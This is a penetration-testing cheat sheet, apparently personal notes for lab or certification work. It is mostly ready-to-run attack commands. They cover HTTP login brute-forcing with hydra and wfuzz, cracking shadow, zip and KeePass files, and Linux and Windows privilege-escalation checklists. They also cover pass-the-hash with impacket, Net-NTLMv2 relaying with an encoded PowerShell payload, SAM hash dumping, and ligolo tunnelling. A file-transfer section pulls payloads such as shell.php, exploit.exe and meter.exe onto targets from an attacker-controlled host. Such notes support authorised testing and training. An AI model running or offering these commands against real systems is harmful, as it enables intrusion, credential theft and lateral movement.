**NMAP**
  nmap sweep scan 
  - nmap -sP 10.10.155.1-225
  Most used nmap scan
  - nmap -p- -A -T4 -sV 10.10.155.5

  THREADER3000
cp ~/Files/Tools/threader3000/threader3000.py .

**Nikto**

**Weak Credentials**
HTTP Brute Force

wfuzz POST
wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php

hydra POST
hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20

wfuzz NTLM
wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api

wfuzz Basic Auth through Proxy
wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/Activos/names.txt -z file,/root/Documents/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/

**Password Cracking**

zip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip 

/etc/shadow
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords

keepass
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file

**Linux Privilege Escalation**
id
sudo -l
sudo -i
uname -a
find / -writable -type d 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
grep -Rni . -e 'password' // search for interesting string recursively in files.
Run Linpeas
Run pspy64
sudo -V
run lse.sh
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000-default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (Pre-Invoke)
Capabilities

**Windows Privilege Escalation**
Kernel Exploits
OS Exploits
Pass The Hash
Password reuse
DLL hijacking (Path)
Vulnerable services
Writable services binaries path
Unquoted services
Listening ports on localhost
Registry keys

**Situational Awareness**
C:\> whoami /groups
PS C:\> Get-LocalUser
PS C:\> Get-LocalGroup
PS C:\> Get-LocalGroupMember Administrators
C:\> systeminfo
C:\> ipconfig /all
C:\> route print
C:\> netstat -ano

**Hidden in Plain View**
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS C:\> Get-Process
PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
PS C:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
PS C:\> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
C:\> net user steve
C:\> runas /user:backupadmin cmd

**Information Gathering Powershell**
PS C:\> Get-History
PS C:\> (Get-PSReadlineOption).HistorySavePath

**Passing NTLM**
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

**Cracking Net-NTLMv2**
kali@kali:~$ sudo responder -I tap0  C:\> dir \\IP_Kali\test

kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

**Relaying Net-NTLMv2**
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t IP_Target -c "powershell -enc JABjAGwAaQBlAG4AdA..."

when finding backup SAM and SYSTEM files in windows.old/Windows/system32

kali@kali:~$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL > SAMhashes

**Tunneling & Port Forwarding**

**ligolo - https://github.com/nicocha30/ligolo-ng**
### Access to agent's local ports (127.0.0.1) https://github.com/nicocha30/ligolo-ng?tab=readme-ov-file#access-to-agents-local-ports-127001


 ./proxy -selfcert
 
sudo ip route add 172.16.1.0/24 dev ligolo

./agent -connect <ip>:11601 -ignore-cert

root@DANTE-WEB-NIX01:~# ./agent -connect 10.10.14.4:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled

INFO[0000] Connection established   addr="10.10.14.4:11601"


**Reverse Shells**
https://www.revshells.com/
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

**Upgrade Shell**
python -c 'import pty;pty.spawn("/bin/bash")’

**HTTP Server**


**Windows File Transfer**

python3 -m http.server 

wget.exe http://<ip>/file -o file

certutil -urlcache -split -f  https://<ip>/file.txt -o file.txt

bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php

cscript wget.vbs http://<ip>/test.txt test.txt

powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"

ftp

client:

echo open [ip] [port] > ftpscript.txt
echo anonymous>> ftpscript.txt
echo PASS >> ftpscript.txt
echo bin >> ftpscript.txt
echo get meter.exe>> ftpscript.txt
echo quit >> ftpscript.txt
ftp -s:ftpscript.txt
server:

python -m pyftpdlib  --port=2121 --write
